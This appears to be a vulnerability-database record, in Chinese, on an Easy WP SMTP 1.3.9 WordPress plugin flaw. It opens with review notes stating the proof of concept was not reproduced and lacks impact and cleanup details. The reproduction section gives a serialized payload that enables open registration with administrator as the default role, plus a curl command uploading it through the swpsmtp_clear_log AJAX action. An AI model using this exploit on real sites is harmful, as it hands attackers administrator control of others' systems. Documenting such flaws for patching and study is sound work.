---
source: "hatch 补库批 20260928"
product: "WordPress Easy WP SMTP"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "WordPress Plugin - Easy WP SMTP 反序列化漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：1.3.9 tested; import reachable via swpsmtp_clear_log AJAX; auth behavior not analyzed"
side_effects: "未执行；本文需注意的操作影响：只上传两步，无返回值及新注册管理员验证，简介/影响/来源均缺；开启注册/默认管理员是持久高影响状态修改，应说明清理而非只贴curl"
source_status: "unknown"
id: "vw-adf655a5752600b5d3e18165"
entity_id: "ve-adf655a5752600b5d3e18165"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：1.3.9 tested; import reachable via swpsmtp_clear_log AJAX; auth behavior not analyzed

- **适用与权限边界（1）**：序列化数据是数组修改注册开关/default_role，不是已证明PHP对象gadget注入；根因应区分导入授权和反序列化。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（2）**：只上传两步，无返回值及新注册管理员验证，简介/影响/来源均缺。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（3）**：需解释为何clear_log动作能触发import_settings及checksum校验边界。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（4）**：开启注册/默认管理员是持久高影响状态修改，应说明清理而非只贴curl。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# WordPress Plugin - Easy WP SMTP 反序列化漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

我们首先搭建一个wordpress站点，安装v1.3.9版本的Easy WP
SMTP，并进行相关配置。

在以下概念验证中，我将用于swpsmtp\_import\_settings上传一个文件，该文件包含恶意的序列化有效负载，该负载将使用户能够注册（users\_can\_register）并将用户默认角色（default\_role）设置为数据库中的"管理员"。

1.创建一个文件名" /tmp/upload.txt"，并添加以下内容：

    a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}

2.上传文件

    $ curl https://0-sec.org/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'


